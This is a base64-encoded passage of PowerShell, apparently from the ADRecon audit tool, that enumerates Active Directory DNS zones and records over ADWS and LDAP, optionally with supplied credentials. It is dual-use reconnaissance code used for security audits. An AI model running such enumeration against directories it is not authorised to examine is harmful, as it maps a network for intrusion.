QURETlNab25lczIKICAgICAgICB9CgogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBETlMgWm9uZXM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEROU1pvbmVBcnJheSkpIgoKICAgICAgICBJZiAoJEROU1pvbmVBcnJheSkKICAgICAgICB7CiAgICAgICAgICAgICRBREROU1pvbmVzT2JqID0gQCgpCiAgICAgICAgICAgICRBREROU05vZGVzT2JqID0gQCgpCiAgICAgICAgICAgICRETlNab25lQXJyYXkgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAjIENyZWF0ZSB0aGUgb2JqZWN0IGZvciBlYWNoIGluc3RhbmNlLgogICAgICAgICAgICAgICAgJE9iaiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBOYW1lIC1WYWx1ZSAkKFtBRFJlY29uLkFEV1NDbGFzc106OkNsZWFuU3RyaW5nKCRfLk5hbWUpKQogICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEROU05vZGVzID0gR2V0LUFET2JqZWN0IC1TZWFyY2hCYXNlICQoJF8uRGlzdGluZ3Vpc2hlZE5hbWUpIC1MREFQRmlsdGVyICcob2JqZWN0Q2xhc3M9ZG5zTm9kZSknIC1Qcm9wZXJ0aWVzIERpc3Rpbmd1aXNoZWROYW1lLGRuc3JlY29yZCxkTlNUb21ic3RvbmVkLE5hbWUsUHJvdGVjdGVkRnJvbUFjY2lkZW50YWxEZWxldGlvbixzaG93SW5BZHZhbmNlZFZpZXdPbmx5LHdoZW5DaGFuZ2VkLHdoZW5DcmVhdGVkCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDYXRjaAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRE5TWm9uZV0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgJCgkXy5EaXN0aW5ndWlzaGVkTmFtZSkgZG5zTm9kZSBPYmplY3RzIgogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgSWYgKCRETlNOb2RlcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUmVjb3JkQ291bnQgLVZhbHVlICQoJEROU05vZGVzIHwgTWVhc3VyZS1PYmplY3QgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBDb3VudCkKICAgICAgICAgICAgICAgICAgICAkRE5TTm9kZXMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpOb2RlID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFpvbmVOYW1lIC1WYWx1ZSAkT2JqLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBOYW1lIC1WYWx1ZSAkXy5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRE5TUmVjb3JkID0gQ29udmVydC1ETlNSZWNvcmQgJF8uZG5zcmVjb3JkWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBjb252ZXJ0aW5nIHRoZSBETlNSZWNvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFJlY29yZFR5cGUgLVZhbHVlICRETlNSZWNvcmQuUmVjb3JkVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERhdGEgLVZhbHVlICRETlNSZWNvcmQuRGF0YQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRUTCAtVmFsdWUgJEROU1JlY29yZC5UVEwKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBZ2UgLVZhbHVlICRETlNSZWNvcmQuQWdlCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpOb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVGltZVN0YW1wIC1WYWx1ZSAkRE5TUmVjb3JkLlRpbWVTdGFtcAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFVwZGF0ZWRBdFNlcmlhbCAtVmFsdWUgJEROU1JlY29yZC5VcGRhdGVkQXRTZXJpYWwKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSB3aGVuQ3JlYXRlZCAtVmFsdWUgJF8ud2hlbkNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSB3aGVuQ2hhbmdlZCAtVmFsdWUgJF8ud2hlbkNoYW5nZWQKICAgICAgICAgICAgICAgICAgICAgICAgIyBUTyBETyBMREFQIHBhcnQKICAgICAgICAgICAgICAgICAgICAgICAgIyRPYmpOb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgZE5TVG9tYnN0b25lZCAtVmFsdWUgJF8uZE5TVG9tYnN0b25lZAogICAgICAgICAgICAgICAgICAgICAgICAjJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQcm90ZWN0ZWRGcm9tQWNjaWRlbnRhbERlbGV0aW9uIC1WYWx1ZSAkXy5Qcm90ZWN0ZWRGcm9tQWNjaWRlbnRhbERlbGV0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpOb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgc2hvd0luQWR2YW5jZWRWaWV3T25seSAtVmFsdWUgJF8uc2hvd0luQWR2YW5jZWRWaWV3T25seQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERpc3Rpbmd1aXNoZWROYW1lIC1WYWx1ZSAkXy5EaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkQURETlNOb2Rlc09iaiArPSAkT2JqTm9kZQogICAgICAgICAgICAgICAgICAgICAgICBJZiAoJEROU1JlY29yZCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEROU1JlY29yZAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBSZWNvcmRDb3VudCAtVmFsdWUgJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBVU05DcmVhdGVkIC1WYWx1ZSAkXy51c25jcmVhdGVkCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVVNOQ2hhbmdlZCAtVmFsdWUgJF8udXNuY2hhbmdlZAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHdoZW5DcmVhdGVkIC1WYWx1ZSAkXy53aGVuQ3JlYXRlZAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHdoZW5DaGFuZ2VkIC1WYWx1ZSAkXy53aGVuQ2hhbmdlZAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERpc3Rpbmd1aXNoZWROYW1lIC1WYWx1ZSAkXy5EaXN0aW5ndWlzaGVkTmFtZQogICAgICAgICAgICAgICAgJEFERE5TWm9uZXNPYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBETlMgUmVjb3JkczogJChbQURSZWNvbi5BRFdTQ2xhc3NdOjpPYmplY3RDb3VudCgkQURETlNOb2Rlc09iaikpIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRE5TWm9uZUFycmF5CiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJuYW1lIiwid2hlbmNyZWF0ZWQiLCJ3aGVuY2hhbmdlZCIsInVzbmNyZWF0ZWQiLCJ1c25jaGFuZ2VkIiwiZGlzdGluZ3Vpc2hlZG5hbWUiKSkKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIihvYmplY3RDbGFzcz1kbnNab25lKSIKICAgICAgICAkT2JqU2VhcmNoZXIuU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURETlNab25lcyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSRE5TWm9uZV0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgZG5zWm9uZSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICAkRE5TWm9uZUFycmF5ID0gQCgpCiAgICAgICAgSWYgKCRBREROU1pvbmVzKQogICAgICAgIHsKICAgICAgICAgICAgJEROU1pvbmVBcnJheSArPSAkQURETlNab25lcwogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURETlNab25lcwogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaFBhdGggPSAiREM9RG9tYWluRG5zWm9uZXMiCiAgICAgICAgSWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KQogICAgICAgIHsKICAgICAgICAgICAgJG9ialNlYXJjaFBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpLyQoJFNlYXJjaFBhdGgpLCQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCRTZWFyY2hQYXRoKSwkKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpIgogICAgICAgIH0KICAgICAgICAkb2JqU2VhcmNoZXJQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkZpbHRlciA9ICIob2JqZWN0Q2xhc3M9ZG5zWm9uZSkiCiAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRvYmpTZWFyY2hlclBhdGguUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoIm5hbWUiLCJ3aGVuY3JlYXRlZCIsIndoZW5jaGFuZ2VkIiwidXNuY3JlYXRlZCIsInVzbmNoYW5nZWQiLCJkaXN0aW5ndWlzaGVkbmFtZSIpKQogICAgICAgICRvYmpTZWFyY2hlclBhdGguU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURETlNab25lczEgPSAkb2JqU2VhcmNoZXJQYXRoLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBEb21haW5EbnNab25lcyBkbnNab25lIE9iamVjdHMuIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5kaXNwb3NlKCkKCiAgICAgICAgSWYgKCRBREROU1pvbmVzMSkKICAgICAgICB7CiAgICAgICAgICAgICRETlNab25lQXJyYXkgKz0gJEFERE5TWm9uZXMxCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREROU1pvbmVzMQogICAgICAgIH0KCiAgICAgICAgJFNlYXJjaFBhdGggPSAiREM9Rm9yZXN0RG5zWm9uZXMiCiAgICAgICAgSWYgKCRDcmVkZW50aWFsIC1uZSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5KQogICAgICAgIHsKICAgICAgICAgICAgJG9ialNlYXJjaFBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeSAiTERBUDovLyQoJERvbWFpbkNvbnRyb2xsZXIpLyQoJFNlYXJjaFBhdGgpLCQoJG9iakRvbWFpbi5kaXN0aW5ndWlzaGVkTmFtZSkiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkCiAgICAgICAgfQogICAgICAgIEVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRvYmpTZWFyY2hQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkgIkxEQVA6Ly8kKCRTZWFyY2hQYXRoKSwkKCRvYmpEb21haW4uZGlzdGluZ3Vpc2hlZE5hbWUpIgogICAgICAgIH0KICAgICAgICAkb2JqU2VhcmNoZXJQYXRoID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9ialNlYXJjaFBhdGgKICAgICAgICAkb2JqU2VhcmNoZXJQYXRoLkZpbHRlciA9ICIob2JqZWN0Q2xhc3M9ZG5zWm9uZSkiCiAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRvYmpTZWFyY2hlclBhdGguUHJvcGVydGllc1RvTG9hZC5BZGRSYW5nZSgoIm5hbWUiLCJ3aGVuY3JlYXRlZCIsIndoZW5jaGFuZ2VkIiwidXNuY3JlYXRlZCIsInVzbmNoYW5nZWQiLCJkaXN0aW5ndWlzaGVkbmFtZSIpKQogICAgICAgICRvYmpTZWFyY2hlclBhdGguU2VhcmNoU2NvcGUgPSAiU3VidHJlZSIKCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURETlNab25lczIgPSAkb2JqU2VhcmNoZXJQYXRoLkZpbmRBbGwoKQogICAgICAgIH0KICAgICAgICBDYXRjaAogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBGb3Jlc3REbnNab25lcyBkbnNab25lIE9iamVjdHMuIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICB9CiAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5kaXNwb3NlKCkKCiAgICAgICAgSWYgKCRBREROU1pvbmVzMikKICAgICAgICB7CiAgICAgICAgICAgICRETlNab25lQXJyYXkgKz0gJEFERE5TWm9uZXMyCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREROU1pvbmVzMgogICAgICAgIH0KCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIEROUyBab25lczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkRE5TWm9uZUFycmF5KSkiCgogICAgICAgIElmICgkRE5TWm9uZUFycmF5KQogICAgICAgIHsKICAgICAgICAgICAgJEFERE5TWm9uZXNPYmogPSBAKCkKICAgICAgICAgICAgJEFERE5TTm9kZXNPYmogPSBAKCkKICAgICAgICAgICAgJEROU1pvbmVBcnJheSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIElmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkRG9tYWluQ29udHJvbGxlcikvJCgkXy5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSIsICRDcmVkZW50aWFsLlVzZXJOYW1lLCRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIEVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkb2JqU2VhcmNoUGF0aCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5ICJMREFQOi8vJCgkXy5Qcm9wZXJ0aWVzLmRpc3Rpbmd1aXNoZWRuYW1lKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGggPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqU2VhcmNoUGF0aAogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5GaWx0ZXIgPSAiKG9iamVjdENsYXNzPWRuc05vZGUpIgogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICAgICAgICAgJG9ialNlYXJjaGVyUGF0aC5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgiZGlzdGluZ3Vpc2hlZG5hbWUiLCJkbnNyZWNvcmQiLCJuYW1lIiwiZGMiLCJzaG93aW5hZHZhbmNlZHZpZXdvbmx5Iiwid2hlbmNoYW5nZWQiLCJ3aGVuY3JlYXRlZCIpKQogICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJEROU05vZGVzID0gJG9ialNlYXJjaGVyUGF0aC5GaW5kQWxsKCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyAkKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpIGRuc05vZGUgT2JqZWN0cyIKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRvYmpTZWFyY2hlclBhdGguZGlzcG9zZSgpCiAgICAgICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgb2JqU2VhcmNoUGF0aAoKICAgICAgICAgICAgICAgICMgQ3JlYXRlIHRoZSBvYmplY3QgZm9yIGVhY2ggaW5zdGFuY2UuCiAgICAgICAgICAgICAgICAkT2JqID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE5hbWUgLVZhbHVlICQoW0FEUmVjb24uTERBUENsYXNzXTo6Q2xlYW5TdHJpbmcoJF8uUHJvcGVydGllcy5uYW1lWzBdKSkKICAgICAgICAgICAgICAgIElmICgkRE5TTm9kZXMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFJlY29yZENvdW50IC1WYWx1ZSAkKCRETlNOb2RlcyB8IE1lYXN1cmUtT2JqZWN0IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgQ291bnQpCiAgICAgICAgICAgICAgICAgICAgJEROU05vZGVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBab25lTmFtZSAtVmFsdWUgJE9iai5OYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRuYW1lID0gKFtzdHJpbmddICQoJF8uUHJvcGVydGllcy5uYW1lKSkKICAgICAgICAgICAgICAgICAgICAgICAgSWYgKC1Ob3QgJG5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRuYW1lID0gKFtzdHJpbmddICQoJF8uUHJvcGVydGllcy5kYykpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBOYW1lIC1WYWx1ZSAkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICBUcnkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEROU1JlY29yZCA9IENvbnZlcnQtRE5TUmVjb3JkICRfLlByb3BlcnRpZXMuZG5zcmVjb3JkWzBdCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgQ2F0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1BRFJETlNab25lXSBFcnJvciB3aGlsZSBjb252ZXJ0aW5nIHRoZSBETlNSZWNvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFJlY29yZFR5cGUgLVZhbHVlICRETlNSZWNvcmQuUmVjb3JkVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIERhdGEgLVZhbHVlICRETlNSZWNvcmQuRGF0YQogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRUTCAtVmFsdWUgJEROU1JlY29yZC5UVEwKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBBZ2UgLVZhbHVlICRETlNSZWNvcmQuQWdlCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpOb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgVGltZVN0YW1wIC1WYWx1ZSAkRE5TUmVjb3JkLlRpbWVTdGFtcAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFVwZGF0ZWRBdFNlcmlhbCAtVmFsdWUgJEROU1JlY29yZC5VcGRhdGVkQXRTZXJpYWwKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSB3aGVuQ3JlYXRlZCAtVmFsdWUgKFtEYXRlVGltZV0gJCgkXy5Qcm9wZXJ0aWVzLndoZW5jcmVhdGVkKSkKICAgICAgICAgICAgICAgICAgICAgICAgJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSB3aGVuQ2hhbmdlZCAtVmFsdWUgKFtEYXRlVGltZV0gJCgkXy5Qcm9wZXJ0aWVzLndoZW5jaGFuZ2VkKSkKICAgICAgICAgICAgICAgICAgICAgICAgIyBUTyBETwogICAgICAgICAgICAgICAgICAgICAgICAjJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBkTlNUb21ic3RvbmVkIC1WYWx1ZSAkbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAjJE9iak5vZGUgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQcm90ZWN0ZWRGcm9tQWNjaWRlbnRhbERlbGV0aW9uIC1WYWx1ZSAkbnVsbAogICAgICAgICAgICAgICAgICAgICAgICAkT2JqTm9kZSB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIHNob3dJbkFkdmFuY2V